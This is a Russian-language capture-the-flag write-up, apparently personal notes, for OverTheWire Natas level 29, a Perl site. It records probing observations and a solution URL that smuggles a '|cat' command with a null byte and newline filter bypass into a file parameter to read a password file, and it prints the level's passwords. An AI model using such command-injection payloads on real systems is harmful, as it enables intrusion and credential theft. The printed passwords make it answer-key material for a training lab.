---
tags:
  - ctf
created: 2026-04-11
---

# `Level [29]` 
> Хакнуть сайт на перл

## 🔐 Учётные данные
| Параметр | Значение                                   |
| -------- | ------------------------------------------ |
| Host     | http://natas29.natas.labs.overthewire.org/ |
| Port     |                                            |
| Login    | natas29                                    |
| Password | 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns           |

## 🎯 Цель уровня
- Прочитать пароль используя command injection с null-byte
## 🎯 Информация

| Тип информации | Данные                                                                                                                                                              |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Ошибка         | right clicking has been blocked!                                                                                                                                    |
| XSS            | `<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">`                                                                         |
| XSS            | `<select name="file" onchange="this.form.submit()">`                                                                                                                |
| XSS test       | `(document.lastmodified)` worked                                                                                                                                    |
| Информация     | Спец символы не выводит                                                                                                                                             |
| Наблюдение     | Если вставить двойную кавычку: ставит пробел перед значением в скобках, добавляет кавычки после return, добавляет ;"=""                                             |
| Наблюдение     | `<body oncontextmenu="  ">` Обычное<br>`<body oncontextmenu=" " "="">` После добавления кавычки<br>`<body oncontextmenu=" " ""="" "="">` После добавления 3 кавычек |
| Наблюдение     | "=" всегда в конец идёт первый<br>При 3 кавычках второе = с 2 кавычками, пробелом от первого                                                                        |
| Наблюдение     | Позволяет делать команду в команде `<body oncontextmenu="javascript:alert(alert('1'));return false;">`                                                              |
| XSS test       | regex значения работают<br>binary значения работают                                                                                                                 |
| XSS test       | while(true) убивает сайт                                                                                                                                            |
| XSS            | \|ls%00 вывело информацию о файлах внутри                                                                                                                           |


## 📚 Ключевые команды/Техники
| Команда | Описание |
| ------- | -------- |
|         |          |
|         |          |
|         |          |

## 💡 Пошаговое решение
| Шаг | Действие                                                   | Команда/Код                                               |
| --- | ---------------------------------------------------------- | --------------------------------------------------------- |
| 1   | Прочитать файл с паролем, обходя фильтр, запрещающий natas | index.pl?file=\|cat /etc/nat\%0Aas_webpass/nat\%0Aas30%00 |
| 2   |                                                            |                                                           |
| 3   |                                                            |                                                           |

## 🔍 Результат
Флаг/Пароль: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH

## 🚪 Переход
-> [Level_29]

## 🔗 Ссылки
- [Название ресурса](URL)